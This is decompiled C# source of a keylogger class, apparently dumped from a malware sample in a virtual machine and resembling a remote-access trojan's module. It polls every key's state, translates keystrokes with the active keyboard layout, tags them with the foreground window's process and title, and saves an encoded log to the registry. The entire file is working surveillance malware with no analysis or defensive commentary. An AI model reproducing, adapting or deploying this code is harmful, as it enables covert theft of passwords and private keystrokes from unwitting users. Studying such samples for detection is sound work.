// Decompiled with JetBrains decompiler
// Type: j.kl
// Assembly: stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5D061B43-92C3-47A8-A000-0E762F8D5CF4
// Assembly location: C:\Users\gorno\Desktop\vm\Dumps\UnknownName\vdump_00400000.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace j
{
  public class kl
  {
    public static string Logs = "";
    public static string Logs_E = "";
    private string LastAS;
    private int LastAV;
    private Keys lastKey;
    public string vn;

    public kl()
    {
      this.lastKey = Keys.None;
      this.vn = A.mtx + "_00";
    }

    private string AV()
    {
      string str;
      try
      {
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        int b;
        kl.GetWindowThreadProcessId(foregroundWindow, ref b);
        Process processById = Process.GetProcessById(b);
        if (!(foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0 | processById.MainWindowTitle.Length == 0))
        {
          this.LastAV = foregroundWindow.ToInt32();
          this.LastAS = processById.MainWindowTitle;
          str = "\r\n\x0001" + DateAndTime.Now.ToString("dd/MM/yyyy ") + processById.ProcessName + " " + this.LastAS + "\x0001\r\n";
          goto label_4;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      str = "";
label_4:
      return str;
    }

    private string Fix(Keys k)
    {
      bool flag = OK.F.Keyboard.ShiftKeyDown;
      bool shiftKeyDown = OK.F.Keyboard.ShiftKeyDown;
      if (OK.F.Keyboard.CapsLock)
        flag = !flag;
      string str1;
      string str2;
      try
      {
        if (!shiftKeyDown)
        {
          switch (k)
          {
            case Keys.D6:
              str1 = "6";
              goto label_25;
            case Keys.OemOpenBrackets:
              str1 = "´";
              goto label_25;
            case Keys.OemQuotes:
              str1 = "~";
              goto label_25;
          }
        }
        else
        {
          switch (k)
          {
            case Keys.D6:
              str1 = "¨";
              goto label_25;
            case Keys.OemOpenBrackets:
              str1 = "`";
              goto label_25;
            case Keys.OemQuotes:
              str1 = "^";
              goto label_25;
          }
        }
        switch (k)
        {
          case Keys.Shift:
          case Keys.Control:
          case Keys.Alt:
          case Keys.F1:
          case Keys.F2:
          case Keys.F3:
          case Keys.F4:
          case Keys.F5:
          case Keys.F6:
          case Keys.F7:
          case Keys.F8:
          case Keys.F9:
          case Keys.F10:
          case Keys.F11:
          case Keys.F12:
          case Keys.LShiftKey:
          case Keys.RShiftKey:
          case Keys.LControlKey:
          case Keys.RControlKey:
          case Keys.ShiftKey:
          case Keys.ControlKey:
          case Keys.End:
            str1 = "";
            goto label_25;
          case Keys.Delete:
          case Keys.Back:
            str1 = "[" + k.ToString() + "]";
            goto label_25;
          case Keys.Return:
            str1 = !kl.Logs.EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "";
            goto label_25;
          case Keys.Space:
            str1 = " ";
            goto label_25;
          case Keys.Tab:
            str1 = "";
            goto label_25;
          default:
            if (flag)
            {
              str1 = kl.VKCodeToUnicode(checked ((uint) k)).ToUpper();
              goto label_25;
            }
            else
            {
              str2 = kl.VKCodeToUnicode(checked ((uint) k));
              break;
            }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          string upper = Strings.ChrW((int) k).ToString().ToUpper();
          ProjectData.ClearProjectError();
          str1 = upper;
          ProjectData.ClearProjectError();
          goto label_25;
        }
        else
        {
          str2 = Strings.ChrW((int) k).ToString().ToLower();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      str1 = str2;
label_25:
      return str1;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int a);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyboardLayout(int a);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] a);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint a, uint b);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(uint a, uint b, byte[] c, [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder d, int e, uint f, IntPtr g);

    private static string VKCodeToUnicode(uint a)
    {
      string str;
      try
      {
        StringBuilder d = new StringBuilder();
        byte[] numArray = new byte[(int) byte.MaxValue];
        if (!kl.GetKeyboardState(numArray))
        {
          str = "";
          goto label_5;
        }
        else
        {
          uint b1 = kl.MapVirtualKey(a, 0U);
          int b2 = 0;
          IntPtr keyboardLayout = (IntPtr) kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(OK.GetForegroundWindow(), ref b2));
          kl.ToUnicodeEx(a, b1, numArray, d, 5, 0U, keyboardLayout);
          str = d.ToString();
          goto label_5;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      str = ((Keys) checked ((int) a)).ToString();
label_5:
      return str;
    }

    public void WRK()
    {
      string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV(this.vn, (object) "")));
      kl.Logs = OK.DEB(ref s);
      kl.Logs_E = "";
      try
      {
        int num1 = 0;
        while (true)
        {
          checked { ++num1; }
          int a = 0;
          do
          {
            if ((int) kl.GetAsyncKeyState(a) == -32767 & !OK.F.Keyboard.CtrlKeyDown)
            {
              Keys k = (Keys) a;
              string str = this.Fix(k);
              if (str.Length > 0)
              {
                kl.Logs += this.AV();
                kl.Logs += str;
                kl.Logs_E += this.AV();
                kl.Logs_E += str;
              }
              this.lastKey = k;
            }
            checked { ++a; }
          }
          while (a <= (int) byte.MaxValue);
          if (num1 == 1000)
          {
            num1 = 0;
            int num2 = checked (Conversions.ToInteger("128") * 1024);
            if (kl.Logs.Length > num2)
              kl.Logs = kl.Logs.Remove(0, checked (kl.Logs.Length - num2));
            if (kl.Logs_E.Length > num2)
              kl.Logs_E = kl.Logs_E.Remove(0, checked (kl.Logs_E.Length - num2));
            string vn = this.vn;
            string logs = kl.Logs;
            string str = OK.ENB(ref logs);
            int num3 = 1;
            OK.STV(vn, (object) str, (RegistryValueKind) num3);
          }
          Thread.Sleep(1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
  }
}
